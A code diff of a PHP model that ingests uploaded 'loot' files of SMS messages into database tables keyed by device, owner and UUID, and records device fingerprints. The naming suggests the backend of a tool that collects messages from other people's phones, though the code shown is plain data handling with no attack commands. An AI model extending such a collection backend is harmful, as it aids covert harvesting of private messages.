@@ -19,27 +19,29 @@ class ModUploads extends Model
 
     public function loot_last_uploaded(){
         $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
-        return $result->getResult()[0]->loot_Id;
+        //return $result->getResult()[0]->loot_Id;
+        return $result->getResult()[0]->loot_Uuid;
     }
 
-    public function loot_info($loot_id){
+    public function loot_info($loot_uuid){
         $builder = $this->db->table('tbl_Loot');
-        $result = $builder->select('loot_Name, loot_Device, loot_Owner')
-            ->where('loot_Id', $loot_id)
+        $result = $builder->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
+            ->where('loot_Uuid', $loot_uuid)
             ->get();
         return $result->getResult();
     }
 
-    public function loot_summary($loot_id){
+    public function loot_summary($loot_uuid){
         $builder = $this->db->table('tbl_Loot_Summary');
-        $result = $builder->where('info_Loot_Id', $loot_id)->get();
+        $result = $builder->where('loot_Uuid', $loot_uuid)->get();
         return $result->getResult();
     }
 
-    public function loot_parse_sms($loot_id){
+    public function loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated){
         $mod_cryption = new ModCryption();
         $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
-            ->where('loot_Id', $loot_id)->get()->getResult();
+            //->where('loot_Id', $loot_id)->get()->getResult();
+            ->where('loot_Uuid', $loot_uuid)->get()->getResult();
         $loot_name = $query_name[0]->loot_Name;
         $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;
 
@@ -81,25 +83,23 @@ class ModUploads extends Model
                     'sms_seen' => $smsdata->Seen,
                     'sms__id' => $smsdata->ID,
                     'sms_body' => $smsdata->Body,
-                    'meta_uploaded' => time(),
-                    'meta_seen' => '0',
-                    'meta_owner' => 020,
-                    'meta_Print' => 010,
+                    'sms_loot_source' => $loot_uuid,
+                    'sms_owner' => $loot_owner,
+                    'sms_device' => $loot_device,
                 );
                 $this->db ->table('tbl_Sms')->insert($data);
             }
         }
 
-        $data = array(
-            'info_Loot_Id' => $loot_id,
-            'info_Count' => $count_receive + $count_sent + $count_other,
+        $data1 = array(
+            'Loot_Uuid' => $loot_uuid,
             'info_Received' => $count_receive,
             'info_Sent' => $count_sent,
             'info_Unknown' => $count_other,
             'info_All' => $count_receive + $count_sent + $count_other,
-            'info_Created' => time()
+            'loot_Created' => $dated
         );
-        $this->db ->table('tbl_Loot_Summary')->insert($data);
+        $this->db ->table('tbl_Loot_Summary')->insert($data1);
 
     }
 
@@ -108,6 +108,7 @@ class ModUploads extends Model
         $get_all = $builder
             ->where('loot_Device', $loot_device)
             ->where('loot_Owner', $loot_owner)
+            ->orderBy('loot_Id', 'DESC')
             ->get();
         return $get_all->getResult();
     }
@@ -117,14 +118,14 @@ class ModUploads extends Model
     }
 
     public function device_check_print($print_dump){
-        $builder = $this->db->table('tbl_Print');
-        $get_all = $builder->select('p_Id')
+        $builder = $this->db->table('tbl_Devices');
+        $get_all = $builder->select('device_Uuid')
                 ->where($print_dump)
                 ->get();
         return $get_all->getResult();
     }
     
     public function device_make_print($print_dump){
-        return $this->db->table('tbl_Print')->insert($print_dump);
+        return $this->db->table('tbl_Devices')->insert($print_dump);
     }
 }
